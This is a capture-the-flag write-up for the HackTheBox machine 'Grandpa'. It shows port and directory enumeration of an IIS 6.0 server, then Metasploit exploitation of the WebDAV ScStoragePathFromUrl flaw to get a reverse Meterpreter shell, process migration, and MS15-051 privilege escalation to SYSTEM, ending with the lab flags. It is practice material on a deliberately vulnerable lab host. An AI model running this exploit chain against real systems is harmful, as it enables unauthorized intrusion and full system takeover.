
---
title: HackTheBox Grandpa
author: Dfaults
date: 2026-09-25T20:00:00-04:00
---

## Enumeration

## Nmap

```bash {hl_lines=[1]}
└─$ rustscan -a 10.129.95.233 -- -sCV -oN nmap-grandpa.txt -t 2000

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.

| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |

| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |

`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

The Modern Day Port Scanner.

________________________________________

: http://discord.skerritt.blog         :

: https://github.com/RustScan/RustScan :

 --------------------------------------

🌍HACK THE PLANET🌍-

[~] The config file is expected to be at "/home/dfaults/.rustscan.toml"

[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers

[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.  
Open 10.129.95.233:80

[~] Starting Script(s)

[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oN nmap-grandpa.txt -t 2000" on ip 10.129.95.233

Depending on the complexity of the script, results may take some time to appear.

[!] Error Exit code = 255

                                                                                                                                                              

└─$ nmap -p 80 -sCV --script exploit grandpa.htb

Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-07 22:08 -0400

Nmap scan report for grandpa.htb (10.129.95.233)

Host is up (0.085s latency).

PORT   STATE SERVICE VERSION

80/tcp open  http    Microsoft IIS httpd 6.0

|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

|_http-csrf: Couldn't find any CSRF vulnerabilities.

|_http-dombased-xss: Couldn't find any DOM based XSS.

|_http-server-header: Microsoft-IIS/6.0

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 47.88 seconds
```

## FFUF Scan

```bash  {hl_lines=[1]}
└─$ ffuf -u http://grandpa.htb/_FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -ac -r -t 50

        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v2.1.0-dev

________________________________________________

 :: Method           : GET

 :: URL              : http://grandpa.htb/_FUZZ

 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt

 :: Follow redirects : true

 :: Calibration      : true

 :: Timeout          : 10

 :: Threads          : 50

 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500

________________________________________________

private                 [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 366ms]
Private                 [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 459ms]
vti_pvt                 [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 404ms]
vti_txt                 [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 76ms]
vti_log                 [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 71ms]
vti_cnf                 [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 441ms]
vti_bin                 [Status: 403, Size: 218, Words: 14, Lines: 2, Duration: 410ms]
PRIVATE                 [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 108ms]

:: Progress: [62281/62281] :: Job [1/1] :: 23 req/sec :: Duration: [0:32:02] :: Errors: 375 ::
```

## Curl Request

```bash {hl_lines=[1]}
└─$ curl -i -X OPTIONS http://grandpa.htb/

HTTP/1.1 200 OK
Date: Sat, 08 Aug 2026 02:53:28 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Cache-Control: private
```

## Nikto Scan

```bash
└─$ nikto -url http://grandpa.htb/             
- Nikto v2.6.0

---------------------------------------------------------------------------

+ Target IP:          10.129.95.233
+ Target Hostname:    grandpa.htb
+ Target Port:        80
+ Platform:           Windows
+ Start Time:         2026-08-07 22:13:49 (GMT-4)

---------------------------------------------------------------------------

+ Server: Microsoft-IIS/6.0
+ ERROR: Failed to check for updates: 403
+ [999986] /: Retrieved microsoftofficewebserver header: 5.0_Pub.
+ [999986] /: Retrieved x-powered-by header: ASP.NET.
+ [999100] /: Uncommon header(s) 'microsoftofficewebserver' found, with contents: 5.0_Pub.
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ ERROR: *** Error limit (20) reached for host, giving up. Last error: . ***
+ ERROR: *** Consider using mitmproxy to avoid TLS fingerprinting. ***
- STATUS: Completed 400 requests (~6% complete, ~3.3 hours left): currently in plugin 'Site Files'
- STATUS: Running average: Not enough data.
+ Scan terminated: 7 errors and 3 items reported on the remote host
+ End Time:           2026-08-07 22:25:17 (GMT-4) (688 seconds)

---------------------------------------------------------------------------

+ 1 host(s) tested
```

## Shell as `inetsrv`

Searching in `msfconsole` we can find an exploit for the Windows IIS 6.0 web server running on this machine. Running a check confirms that grandpa is vulnerable to the `iis_webdav_scstoragepathfromurl` exploit.

```bash {hl_lines=[4]}
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check  
[+] 10.129.95.233:80 - The target is vulnerable. IIS/6.0 with WebDAV enabled detected

msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.15.163:4444  
[*] Trying path length 3 to 60 ...

[*] Sending stage (199238 bytes) to 10.129.95.233

[*] Meterpreter session 1 opened (10.10.15.163:4444 -> 10.129.95.233:1033) at 2026-08-07 23:02:22 -0400

meterpreter > pwd

c:\windows\system32\inetsrv

meterpreter >
```

## Windows Local Privilege Suggester

```bash

 #   Name                                                              Potentially Vulnerable?  Check Result

 -   ----                                                              -----------------------  ------------

 1   exploit/windows/local/ms10_015_kitrap0d                           Yes                      The service is running, but could not be validated. Version W
indows Server 2003 detected but not confirmed vulnerable
 2   exploit/windows/local/ms14_058_track_popup_menu                   Yes                      The target appears to be vulnerable. Revision 3959 appears vu
lnerable
 3   exploit/windows/local/ms14_070_tcpip_ioctl                        Yes                      The target appears to be vulnerable. Revision 3959 appears vu
lnerable
 4   exploit/windows/local/ms15_051_client_copy_image                  Yes                      The target appears to be vulnerable. Revision 3959 appears vu
lnerable
 5   exploit/windows/local/ms16_016_webdav                             Yes                      The service is running, but could not be validated. 32-bit ta
rget detected
 6   exploit/windows/local/ppr_flatten_rec                             Yes                      The target appears to be vulnerable. Revision 3959 appears vu
lnerable
 7   exploit/windows/persistence/bits                                  Yes                      The target is vulnerable. Likely exploitable
 8   exploit/windows/persistence/registry_userinit                     Yes                      The target is vulnerable. Registry likely exploitable
```

Here I chose to use `exploit/windows/local/ms15_051_client_copy_image` as this exploit worked in the past with the `Grandma` machine I previously worked on. Grandpa however, has the same issue as grandma where we will need to migrate to a different service on the machine in order to escalate our privileges. Otherwise we will get an error stating `Access denied`

```bash {hl_lines=[15]}
meterpreter > ps

Process List

============

 PID   PPID  Name               Arch  Session  User                          Path

 ---   ----  ----               ----  -------  ----                          ----

1852  392   dllhost.exe
1916  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
2072  344   logon.scr

meterpreter > migrate 1916

[*] Migrating from 3004 to 1916...

[*] Migration completed successfully.
```

Now we run our copy_image exploit to get a shell as NT/Authority Network

```bash {hl_lines=[12]}
msf exploit(windows/local/ms15_051_client_copy_image) > run  

[*] Started reverse TCP handler on 10.10.15.163:4444  
[*] Reflectively injecting the exploit DLL and executing it...

[*] Launching msiexec to host the DLL...

[+] Process 2004 launched.

[*] Reflectively injecting the DLL into 2004...

[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.

[*] Sending stage (199238 bytes) to 10.129.95.233

[*] Meterpreter session 2 opened (10.10.15.163:4444 -> 10.129.95.233:1035) at 2026-08-07 23:38:32 -0400

```

# Shell as NT/AUTHORITY SYSTEM

```bash {hl_lines=[10]}
meterpreter > sysinfo  
Computer        : GRANPA
OS              : Windows Server 2003 (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid  
Server username: NT AUTHORITY\SYSTEM
```

Now we just need to get our flags and submit them.

```bash

meterpreter > cd Documents\ and\ Settings\\
meterpreter > ls

Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name

----              ----  ----  -------------              ----

040777/rwxrwxrwx  0     dir   2017-04-12 10:12:15 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-04-12 10:03:34 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-04-12 10:04:48 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-04-12 10:32:01 -0400  Harry
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:32 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:31 -0400  NetworkService

meterpreter > cat Harry\\Desktop\\user.txt  
bdff5ec67c3cff017f2bedc146a5d869

meterpreter > cat Administrator\\Desktop\\root.txt  
9359e905a2c35f861f6a57cecf28bb7b
```
